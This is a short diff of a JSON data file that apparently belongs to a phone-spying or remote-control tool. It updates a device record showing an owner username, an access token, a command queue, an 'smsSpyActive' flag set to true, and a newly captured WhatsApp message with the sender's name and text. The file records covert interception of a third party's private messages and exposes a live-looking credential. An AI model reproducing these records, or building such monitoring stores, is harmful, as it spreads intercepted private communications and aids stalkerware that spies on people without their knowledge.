@@ -7976,7 +7976,7 @@
     "deviceName": "HP-RRR-85A1",
     "ownerUsername": "raditcees",
     "token": "d40c7b4bef4b07ee53e2456f723de6fe",
-    "lastSeen": 1777191850962,
+    "lastSeen": 1777191868508,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T07:30:11.065Z",
@@ -7992,6 +7992,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Rezky",
+        "content": "Di ketring salzabila",
+        "time": "26/04 16:24",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777191869635
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
